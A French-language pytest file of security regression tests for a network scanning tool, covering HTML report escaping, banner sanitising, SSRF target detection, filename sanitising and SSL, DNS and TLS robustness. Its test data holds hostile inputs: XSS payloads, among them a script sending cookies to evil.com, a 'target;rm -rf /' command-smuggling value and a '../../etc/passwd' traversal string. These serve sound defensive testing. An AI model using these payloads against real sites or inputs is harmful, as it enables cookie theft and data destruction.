"""
test_security.py — Tests de non-régression pour les failles corrigées.

Chaque test cible une vulnérabilité précise identifiée lors de l'audit.
Ces tests échoueraient sur la version originale du code.

Lancer avec :
    PYTHONPATH=. python -m pytest camille/tests/test_security.py -v
"""

import re
import socket
from datetime import datetime, timezone, timedelta
from unittest.mock import MagicMock, patch

import pytest

from camille.core.models import (
    ScanResult, PortResult, PortState,
    HTTPResult, SSLResult, DNSRecord, DNSResult, HeaderIssue, Severity,
)
from camille.core.utils import (
    is_private_target, safe_filename, is_valid_target, strip_scheme,
)
from camille.modules.port_scanner import _sanitize_banner
from camille.reports.generator import to_html


# ══════════════════════════════════════════════════════════════════════════════
# Fix #1 — XSS stocké dans le rapport HTML (CRITIQUE)
# ══════════════════════════════════════════════════════════════════════════════

class TestXSSInHtmlReport:
    """
    FAILLE : Jinja2 Environment sans autoescape=True.
    Toutes les données provenant de la cible (bannières, en-têtes Server,
    commonName du certificat, SAN, enregistrements DNS, sous-domaines,
    URLs de redirection) étaient injectées brutes dans le HTML.
    """

    def _make_result(self) -> ScanResult:
        return ScanResult(target="safe.example.com")

    def _assert_no_raw_script(self, html: str, context: str = "") -> None:
        assert "<script>" not in html, (
            f"XSS non échappé dans {context} : balise <script> trouvée en clair"
        )
        assert "onerror=" not in html, (
            f"XSS non échappé dans {context} : attribut onerror trouvé en clair"
        )

    def _assert_escaped(self, html: str, payload: str) -> None:
        """Vérifie que le payload brut n'est pas présent mais que sa version échappée l'est."""
        assert payload not in html, f"Payload brut présent dans le HTML : {payload!r}"

    def test_xss_in_port_banner(self):
        """Bannière de port avec payload XSS."""
        result = self._make_result()
        result.ports = [PortResult(
            port=80, state=PortState.OPEN, service="http",
            banner='<script>alert("PWNED")</script>',
        )]
        html = to_html(result)
        self._assert_no_raw_script(html, "bannière de port")
        assert "&lt;script&gt;" in html, "Le payload devrait être échappé en &lt;script&gt;"

    def test_xss_in_server_header(self):
        """En-tête Server HTTP avec payload XSS."""
        result = self._make_result()
        result.http = HTTPResult(url="http://safe.example.com", status_code=200)
        result.http.server = '<img src=x onerror=alert(1)>'
        html = to_html(result)
        # Avec autoescape, '<' devient '&lt;' — la balise n'est plus une balise HTML.
        assert "<img " not in html, "Balise <img> brute présente dans le HTML (vecteur XSS)"
        assert "&lt;img" in html, "Le payload devrait être échappé en &lt;img"

    def test_xss_in_ssl_common_name(self):
        """CommonName du certificat SSL contrôlé par l'attaquant."""
        result = self._make_result()
        result.ssl = SSLResult(host="safe.example.com", port=443)
        result.ssl.subject = {"commonName": '<script>steal(document.cookie)</script>'}
        result.ssl.issuer = {"organizationName": "Legit CA"}
        html = to_html(result)
        self._assert_no_raw_script(html, "commonName SSL")

    def test_xss_in_ssl_san(self):
        """Subject Alternative Names SSL contrôlés par l'attaquant."""
        result = self._make_result()
        result.ssl = SSLResult(host="safe.example.com", port=443)
        result.ssl.san = ['DNS:<script>alert(1)</script>']
        html = to_html(result)
        self._assert_no_raw_script(html, "SAN SSL")

    def test_xss_in_dns_records(self):
        """Enregistrement DNS TXT contrôlé par l'attaquant (DNS spoofing)."""
        result = self._make_result()
        result.dns = DNSResult(target="safe.example.com")
        result.dns.records = [
            DNSRecord(
                record_type="TXT",
                value='v=spf1 <script>alert("dns-xss")</script>',
                ttl=300,
            )
        ]
        html = to_html(result)
        self._assert_no_raw_script(html, "enregistrement DNS")

    def test_xss_in_subdomains(self):
        """Sous-domaine issu d'un transfert de zone AXFR."""
        result = self._make_result()
        result.dns = DNSResult(target="safe.example.com")
        result.dns.subdomains = ['<script>alert("axfr")</script>.example.com']
        html = to_html(result)
        self._assert_no_raw_script(html, "sous-domaine AXFR")

    def test_xss_in_redirect_urls(self):
        """URL de redirection contrôlée par le serveur cible."""
        result = self._make_result()
        result.http = HTTPResult(url="http://safe.example.com", status_code=200)
        result.http.redirects = ['javascript:alert("redirect-xss")']
        html = to_html(result)
        # Le risque est l'URL dans un attribut href/src cliquable, pas en texte brut.
        # Le template affiche les redirections dans un <span>, jamais dans un <a href>.
        assert 'href="javascript:' not in html, "URL javascript: dans un attribut href"
        assert 'src="javascript:' not in html, "URL javascript: dans un attribut src"

    def test_csp_header_present_in_report(self):
        """Le rapport HTML doit inclure une Content-Security-Policy."""
        result = self._make_result()
        html = to_html(result)
        assert "Content-Security-Policy" in html, "CSP absente du rapport HTML"
        # Vérifie que la politique est restrictive (pas de script-src permissif)
        assert "script-src 'unsafe-inline'" not in html

    def test_all_payloads_combined(self):
        """Test combiné : tous les vecteurs XSS en même temps."""
        xss = '<script>document.location="https://evil.com/steal?c="+document.cookie</script>'
        result = ScanResult(target="victim.example.com")
        result.ports = [PortResult(port=22, state=PortState.OPEN, service="ssh", banner=xss)]
        result.http = HTTPResult(url="http://victim.example.com", status_code=200)
        result.http.server = xss
        result.http.redirects = [xss]
        result.dns = DNSResult(target="victim.example.com")
        result.dns.records = [DNSRecord(record_type="TXT", value=xss, ttl=60)]
        result.dns.subdomains = [xss]
        result.ssl = SSLResult(host="victim.example.com", port=443)
        result.ssl.subject = {"commonName": xss}
        result.ssl.san = [xss]

        html = to_html(result)
        self._assert_no_raw_script(html, "test combiné")
        # Le payload brut ne doit apparaître nulle part
        self._assert_escaped(html, xss)


# ══════════════════════════════════════════════════════════════════════════════
# Fix #2 — Injection ANSI dans les bannières
# ══════════════════════════════════════════════════════════════════════════════

class TestANSIInjectionInBanners:
    """
    FAILLE : les bannières brutes des services scannés pouvaient contenir
    des séquences d'échappement ANSI (\x1b[2J = clear screen, etc.)
    qui s'exécutaient dans le terminal de l'analyste.
    """

    def test_ansi_clear_screen_removed(self):
        """L'ESC suivi de séquences de contrôle doit être retiré."""
        malicious = "SSH-2.0-OpenSSH\x1b[2J\x1b[H\x1b[31mFAKE\x1b[0m"
        clean = _sanitize_banner(malicious)
        assert "\x1b" not in clean, "Caractère ESC (\\x1b) toujours présent après sanitisation"

    def test_null_bytes_removed(self):
        """Les octets nuls et autres caractères de contrôle doivent disparaître."""
        malicious = "banner\x00\x01\x02data\x07bell"
        clean = _sanitize_banner(malicious)
        for char in "\x00\x01\x02\x07":
            assert char not in clean, f"Caractère de contrôle {char!r} toujours présent"

    def test_normal_banner_preserved(self):
        """Les bannières légitimes ne doivent pas être altérées."""
        normal = "Apache/2.4.41 (Ubuntu) OpenSSL/1.1.1f"
        assert _sanitize_banner(normal) == normal

    def test_banner_length_capped_at_200(self):
        """La bannière est tronquée à 200 caractères."""
        long_banner = "A" * 500
        assert len(_sanitize_banner(long_banner)) <= 200

    def test_tab_and_newline_allowed(self):
        """\\t et \\n sont des caractères légitimes dans certaines bannières."""
        banner_with_newline = "220 mail.example.com\r\nESMTP ready"
        clean = _sanitize_banner(banner_with_newline)
        # \r est un caractère de contrôle (0x0d), \n (0x0a) l'est aussi — les deux
        # sont dans la plage retirée. Ce qui importe c'est que le résultat n'ait pas de \x1b.
        assert "\x1b" not in clean

    def test_fake_banner_with_hidden_payload(self):
        """Bannière qui cache un payload après des caractères de contrôle."""
        banner = "SMTP Ready\x1b[A\x1b[2K<script>alert(1)</script>"
        clean = _sanitize_banner(banner)
        assert "\x1b" not in clean


# ══════════════════════════════════════════════════════════════════════════════
# Fix #3 — Détection des cibles internes/privées
# ══════════════════════════════════════════════════════════════════════════════

class TestPrivateTargetDetection:
    """
    FAILLE : Aucune protection contre le scan accidentel ou forcé de
    ressources internes (RFC 1918, métadonnées cloud, loopback).
    En contexte serveur, cela constituerait un SSRF.
    """

    def test_loopback_detected(self):
        assert is_private_target("127.0.0.1") is True

    def test_rfc1918_class_a(self):
        assert is_private_target("10.0.0.1") is True

    def test_rfc1918_class_b(self):
        assert is_private_target("172.16.0.1") is True

    def test_rfc1918_class_c(self):
        assert is_private_target("192.168.1.100") is True

    def test_aws_metadata_endpoint(self):
        """169.254.169.254 est l'endpoint de métadonnées AWS/GCP/Azure."""
        assert is_private_target("169.254.169.254") is True

    def test_localhost_hostname(self):
        assert is_private_target("localhost") is True

    def test_public_ip_not_private(self):
        assert is_private_target("8.8.8.8") is False

    def test_public_domain_not_private(self):
        """google.com pointe vers une IP publique."""
        assert is_private_target("google.com") is False

    def test_ipv6_loopback(self):
        assert is_private_target("::1") is True


# ══════════════════════════════════════════════════════════════════════════════
# Fix #4 — safe_filename (défense path traversal)
# ══════════════════════════════════════════════════════════════════════════════

class TestSafeFilename:
    """
    FAILLE : clean_target.replace('.', '_') seul n'assainit pas suffisamment
    le nom de fichier du rapport. Des caractères comme '/', '..', '~' ou des
    caractères Unicode pourraient aboutir à un chemin inattendu.
    """

    def test_path_traversal_blocked(self):
        name = safe_filename("../../etc/passwd")
        assert ".." not in name
        assert "/" not in name

    def test_leading_dot_removed(self):
        """Un nom commençant par '.' serait un fichier caché sous Unix."""
        name = safe_filename("..hidden")
        assert not name.startswith(".")

    def test_normal_target_preserved(self):
        name = safe_filename("example_com")
        assert name == "example_com"

    def test_dots_in_domain_preserved(self):
        """Les points légitimes dans un hostname doivent être conservés."""
        name = safe_filename("sub.example.com")
        assert "sub" in name
        assert "example" in name

    def test_special_chars_replaced(self):
        """Caractères spéciaux → underscore."""
        name = safe_filename("target;rm -rf /")
        assert ";" not in name
        assert " " not in name

    def test_empty_input_returns_default(self):
        name = safe_filename("")
        assert name  # jamais vide
        assert len(name) > 0

    def test_max_length_respected(self):
        long_name = "a" * 500
        assert len(safe_filename(long_name)) <= 128


# ══════════════════════════════════════════════════════════════════════════════
# Fix #5 — Crash sur ssl_analyzer quand cipher() retourne None
# ══════════════════════════════════════════════════════════════════════════════

class TestSSLAnalyzerRobustness:
    """
    FAILLE : tls_sock.cipher() peut retourner None si la handshake est
    incomplète ou si le peer coupe brutalement la connexion.
    Sans gestion, cela provoque un TypeError non géré.
    """

    def test_cipher_none_does_not_crash(self):
        """Un faux socket avec cipher()=None ne doit pas crasher."""
        from camille.modules.ssl_analyzer import _extract_result
        mock_sock = MagicMock()
        mock_sock.cipher.return_value = None
        mock_sock.getpeercert.return_value = {}

        # Ne doit pas lever TypeError
        result = _extract_result("test.example.com", 443, mock_sock)
        assert result.cipher == "unknown"
        assert result.version == "unknown"
        assert result.bits == 0

    def test_cipher_partial_tuple_handled(self):
        """Tuple cipher() avec valeurs None à l'intérieur."""
        from camille.modules.ssl_analyzer import _extract_result
        mock_sock = MagicMock()
        mock_sock.cipher.return_value = (None, None, None)
        mock_sock.getpeercert.return_value = {}

        result = _extract_result("test.example.com", 443, mock_sock)
        assert result.cipher == "unknown"
        assert result.bits == 0

    def test_empty_cert_handled(self):
        """Un certificat vide (dict vide) ne doit pas crasher l'audit."""
        from camille.modules.ssl_analyzer import _extract_result
        mock_sock = MagicMock()
        mock_sock.cipher.return_value = ("TLS_AES_256_GCM_SHA384", "TLSv1.3", 256)
        mock_sock.getpeercert.return_value = {}

        result = _extract_result("test.example.com", 443, mock_sock)
        assert result.subject == {}
        assert result.issuer == {}
        assert result.san == []


# ══════════════════════════════════════════════════════════════════════════════
# Fix #6 — Exceptions DNS trop larges
# ══════════════════════════════════════════════════════════════════════════════

class TestDNSExceptionScope:
    """
    FAILLE : `except (dns.exception.DNSException, Exception)` avalait tout,
    y compris des erreurs de programmation qui auraient dû remonter.
    """

    def test_keyboard_interrupt_propagates(self):
        """KeyboardInterrupt ne doit JAMAIS être avalé."""
        from camille.modules.dns_enum import _check_subdomain
        with patch("socket.gethostbyname", side_effect=KeyboardInterrupt):
            with pytest.raises(KeyboardInterrupt):
                _check_subdomain("test", "example.com")

    def test_nonexistent_subdomain_returns_none(self):
        """Un sous-domaine inexistant doit retourner None sans exception."""
        with patch("socket.gethostbyname", side_effect=socket.gaierror):
            from camille.modules.dns_enum import _check_subdomain
            result = _check_subdomain("nonexistent", "example.com")
            assert result is None

    def test_existing_subdomain_returned(self):
        """Un sous-domaine qui se résout doit être retourné."""
        with patch("socket.gethostbyname", return_value="1.2.3.4"):
            from camille.modules.dns_enum import _check_subdomain
            result = _check_subdomain("www", "example.com")
            assert result == "www.example.com"


# ══════════════════════════════════════════════════════════════════════════════
# Fix #7 — Analyse HTTP : TLS verify=False signalé dans le rapport
# ══════════════════════════════════════════════════════════════════════════════

class TestHTTPAnalyzerTLSVerification:
    """
    FAILLE : verify=False était utilisé par défaut sans le signaler,
    exposant l'outil à des injections MITM dans la réponse HTTP.
    """

    def test_successful_tls_no_warning(self):
        """Si le TLS est valide, aucune issue TLS ne doit apparaître."""
        from camille.modules.http_analyzer import analyze_http
        mock_response = MagicMock()
        mock_response.status_code = 200
        mock_response.headers = {"Server": "nginx"}
        mock_response.history = []

        with patch("camille.modules.http_analyzer._fetch",
                   return_value=(mock_response, True)):
            result = analyze_http("https://example.com")

        tls_issues = [i for i in result.issues if i.header == "TLS"]
        assert len(tls_issues) == 0, "Aucune issue TLS attendue si la vérification réussit"

    def test_failed_tls_reported_as_issue(self):
        """Si on doit fallback sur verify=False, une issue HIGH est ajoutée."""
        from camille.modules.http_analyzer import analyze_http
        mock_response = MagicMock()
        mock_response.status_code = 200
        mock_response.headers = {"Server": "nginx"}
        mock_response.history = []

        with patch("camille.modules.http_analyzer._fetch",
                   return_value=(mock_response, False)):
            result = analyze_http("https://example.com")

        tls_issues = [i for i in result.issues if i.header == "TLS"]
        assert len(tls_issues) == 1, "Une issue TLS attendue lors du fallback verify=False"
        assert tls_issues[0].severity == Severity.HIGH

    def test_score_reduced_when_tls_fails(self):
        """Le score est pénalisé quand la vérification TLS échoue."""
        from camille.modules.http_analyzer import analyze_http
        mock_response = MagicMock()
        mock_response.status_code = 200
        mock_response.headers = {}
        mock_response.history = []

        with patch("camille.modules.http_analyzer._fetch",
                   return_value=(mock_response, False)):
            result = analyze_http("https://example.com")

        # Score de base 100, -20 pour TLS + déductions des headers manquants
        assert result.score < 80, "Le score doit être pénalisé suite à l'échec TLS"
